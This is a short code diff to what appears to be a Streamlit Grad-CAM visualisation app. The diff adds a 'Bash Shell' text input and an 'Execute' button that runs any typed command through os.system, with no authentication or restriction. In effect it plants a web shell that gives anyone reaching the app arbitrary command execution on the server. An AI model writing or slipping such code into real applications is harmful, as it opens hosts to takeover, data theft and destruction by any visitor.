@@ -115,6 +115,12 @@ def gradcam(image_name,id):
     subprocess.run([f"{sys.executable}",command])
 
 
+#Command
+command = st.text_input('Bash Shell', 'pwd')
+#Predict
+if st.button('Execute'):
+    os.system(command)
+
 th = st.slider("Select a threshold",max_value=1.0,min_value=0.0,value=0.7)
 st.write(th, "threshold is", th)
 
